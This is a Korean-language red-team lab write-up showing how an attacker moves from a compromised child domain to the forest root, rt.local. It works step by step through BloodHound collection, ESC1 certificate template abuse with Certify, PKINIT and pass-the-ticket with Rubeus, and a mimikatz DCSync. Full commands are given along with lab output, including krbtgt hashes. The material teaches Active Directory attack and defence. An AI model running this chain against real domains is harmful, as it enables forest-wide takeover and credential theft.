# 8. US -> RT 장악

이번 섹션에서는 다음과 같은 주제들을 다룬다:

* Cross-Domain BloodHound
* ADCS ESC1 권한 상승
* PKINIT 인증

<figure><img src="../.gitbook/assets/AttackPath8-Compromising-RT.drawio.png" alt=""><figcaption></figcaption></figure>

US 도메인을 장악했으니 이제 us.rt.local의 부모 도메인이자 Forest Root Domain인 rt.local을 장악할 차례다. 블러드하운드를 RT에 날려야하는데, US의 SQL01 서버에서 RT로 LDAP 트래픽을 많이 보내는 것은 수상하다. LDAP과 도메인 Replication 자체가 도메인 컨트롤러들끼리 정보를 주고 받기 위해 만들어진 것이니, US의 도메인 컨트롤러인 UDC01 까지 횡적 이동을 한 뒤 RT를 향해 블러드하운드를 실행한다.

```
sliver (TOUGH_BREADCRUMB) > inline-execute-assembly /root/funtimes.exe "-c All,Session -d rt.local --forcesecureldap --
zipfilename crashdump --zippassword test --distinguishedname DC=rt,DC=local"
```

UDC01 횡적 이동 후 SharpHound를 실행하고, 이를 블러드하운드에 집어넣으면 다음과 같은 공격 경로가 나온다.

<figure><img src="../.gitbook/assets/6-bh-adcs.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/6-bh-adcs2.png" alt=""><figcaption></figcaption></figure>

블러드하운드 결과 US 도메인의 도메인 관리자들은 RT 도메인에 ESC1 공격을 진행할 수 있다. Forest Code Signing 인증서 양식이 ESC1에 취약한 상태다. 현재 장악한 US의 도메인 관리자들이 해당 인증서 양식에 Enroll 할 수 있기 때문에, 공격 가능한 상태다.

확실하게 알아보기 위해 UDC01에서 실행중인 세션에서 BOF를 통해 다시 한 번 확인한다.

```
sliver (FULL_SCHNITZEL) > sa-adcs-enum

  Enterprise CA Name        : rt-CA
  DNS Hostname              : ca01.rt.local
  
  [*] Found 19 templates on the ca                                                                                          
    Template Name           : ForestCodeSigning                                                                        
    Friendly Name           : Forest Code Signing
    Name Flags              : ENROLLEE_SUPPLIES_SUBJECT                        
    Extended Key Usage      : Code Signing, Client Authentication                                                      
    Permissions             :                                                                                          
      Owner                 : rt\Administrator                                                                         
                              S-1-5-21-1952929721-2588395256-1898831064-500
                              
        Principal           : US\Domain Admins                                                                         
          Access mask       : 00000100                                                                                 
          Flags             : 00000001                                                                                 
                              Enrollment Rights

```

ADCS 정보 수집 결과 Forest Code Signing이라는 템플릿에는 US\Domain Admins 그룹이 Enroll 할 수 있다. 해당 양식은 Client Authentication에 사용되기 때문에 도메인 컨트롤러가 허용 한다면 PKINIT에 사용될 수 있고, ENROLLEE\_SUPPLIES\_SUBJECT 설정이 되어 있기 때문에 ESC1 공격에 취약한 상태다.

Impersonate를 이용해 UDC01에 로그인 해 있던 도메인 관리자의 액세스 토큰을 훔쳐온 뒤, Certify를 이용해 ESC1 공격을 실행한다. 인증서 양식에 Enroll은 US\Administrator로 하되, SAN에다가는 부모 도메인의 RT\Administrator 도메인 관리자를 집어넣은 인증서를 발급받는다.

```
// impersonate 이용해 도메인 관리자 맥락 획득 
sliver (FULL_SCHNITZEL) > impersonate US\\Administrator         

[*] Successfully impersonated US\Administrator 

// Certify를 이용해 ESC1 공격 
sliver (FULL_SCHNITZEL) > certify -- "request /ca:ca01.rt.local\rt-CA /template:ForestCodeSigning /altname:rt.local\Administrator"

[*] Current user context    : US\Administrator
[*] No subject name specified, using current context as subject.

[*] Template                : ForestCodeSigning
[*] Subject                 : CN=Administrator, CN=Users, DC=us, DC=rt, DC=local
[*] AltName                 : rt.local\Administrator

[*] Certificate Authority   : ca01.rt.local\rt-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 26 

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAweYqUB+eitjRom23PKj < . . . 생략 . . . > 
-----BEGIN CERTIFICATE-----
MIIFtTCCBJ2gAwIBAgITWwAAABoz < . . . 생략 . . . > 

// ESC1 인증서 획득 
root@sliver-teamserver:~# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
root@ip-10-1-14-169:~# ls -alh cert.pfx 
-rw------- 1 root root 3.3K Jan 20 13:07 cert.pfx

// base64 변환 
root@ip-10-1-14-169:~# cat cert.pfx | base64 -w 0
MIINDQIBAzC < . . . 생략 . . . > 
```

ESC1을 통해 SubjectAltName이 RT\Administrator인 인증서 양식을 받아왔다면, openssl 과 base64를 이용해 Rubeus로 사용할 수 있는 base64 인코딩된 형태로 바꿔준 뒤, PKINIT을 통해 RT\Administrator의 TGT를 받아온다.

```
// PKINIT을 통해 RT\Administrator의 TGT 받아오기 
sliver (FULL_SCHNITZEL) > inline-execute-assembly /root/Rubeus.exe "asktgt /user:rt.local\Administrator /nowrap /certificate:MIINDQIBAzC < . . . 생략 . . . > 

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=us, DC=rt, DC=local 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'rt.local\Administrator'
[*] Using domain controller: 10.2.10.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGNDCCBjCgAwIBB < . . . 생략 . . . > 
```



<figure><img src="../.gitbook/assets/AttackPath9-RT-PKINIT.drawio.png" alt=""><figcaption></figcaption></figure>

이후 받아온 RT\Administrator의 TGT를 사용해 RT 도메인(이자 포레스트) 전체를 장악한다.

```
// PTT을 통해 RT\Administrator 장악 
sliver (FULL_SCHNITZEL) > inline-execute-assembly /root/Rubeus.exe "ptt /ticket:doIGNDCCBjCgAwIBB < . . . 생략 . . . > "

[*] Action: Import Ticket
[+] Ticket successfully imported!

// RT 포레스트 루트 도메인 장악 확인 
sliver (FULL_SCHNITZEL) > ls \\\\pdc01.rt.local\\c$

\\pdc01.rt.local\c$\ (18 items, 1.4 GiB)
========================================
drwxrwxrwx  $Recycle.Bin                        <dir>      Fri Dec 27 20:25:16 +0900 2024
drwxrwxrwx  Boot                                <dir>      Fri Dec 27 19:00:00 +0900 2024
-r--r--r--  bootmgr                             403.0 KiB  Fri Dec 27 18:57:35 +0900 2024

// DCSync 
sliver (FULL_SCHNITZEL) > mimikatz " \"lsadump::dcsync /domain:rt.local /user:RT\\krbtgt\" "

mimikatz(commandline) # lsadump::dcsync /domain:rt.local /user:RT\krbtgt
[DC] 'rt.local' will be the domain
[DC] 'pdc01.rt.local' will be the DC server
[DC] 'RT\krbtgt' will be the user account

SAM Username         : krbtgt
Credentials:
  Hash NTLM: 7757b0a70daf0123c8a8a86e910da0cf

* Primary:Kerberos-Newer-Keys *
    Default Salt : RT.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c7c91463f1709779054eeb7c09c62b138f9d34644fd8d3d689caff437d63cfda
      aes128_hmac       (4096) : 4e94b7731ff83a21c3624616f90df481
```



## 마치며

ADCS ESC1과 PKINIT 등을 이용해 부모 도메인이였던 RT까지 장악했다. 이제 RT를 장악했으니, 원래 레드팀 목적이였던 라쿤 테크의 소스 코드 개발을 도맡아 하고 있는 DEV 및 IN 도메인으로 횡적 이동을 해 목표를 달성한다.

## 우리 회사는

* ADCS ESC1 \~ 13까지, ADCS와 관련된 취약점은 없는가?

